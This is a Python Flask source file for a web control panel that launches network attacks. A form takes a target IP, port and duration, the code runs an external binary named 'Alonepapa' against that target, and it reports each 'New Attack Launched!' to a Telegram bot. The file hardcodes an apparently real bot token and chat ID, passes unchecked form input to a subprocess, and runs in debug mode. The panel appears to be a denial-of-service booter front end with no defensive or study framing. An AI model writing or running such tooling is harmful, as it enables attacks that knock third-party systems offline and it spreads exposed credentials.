from flask import Flask, render_template, request, redirect
import subprocess
import threading
import time
import requests

app = Flask(__name__)
status = {"running": False}

# Telegram setup
BOT_TOKEN = '7819992909:AAFzi4cQqmsxApeiGeu2OJDiFM2dC6zcMcY'
CHAT_ID = '1662672529'

def send_telegram_log(ip, port, duration):
    message = f"🚀 *New Attack Launched!*\n\n🖥️ IP: `{ip}`\n🔌 Port: `{port}`\n⏱️ Duration: `{duration}` sec"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})

def run_attack(ip, port, duration):
    status["running"] = True
    send_telegram_log(ip, port, duration)
    subprocess.call(["./Alonepapa", ip, port, duration])
    time.sleep(int(duration))
    status["running"] = False

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        if request.form.get("action") == "reset":
            return redirect("/")
        ip = request.form.get("ip")
        port = request.form.get("port")
        duration = request.form.get("duration")
        thread = threading.Thread(target=run_attack, args=(ip, port, duration))
        thread.start()
        return render_template("index.html", launched=True, duration=duration, ip=ip, port=port)
    return render_template("index.html", launched=False)

if __name__ == "__main__":
    app.run(debug=True)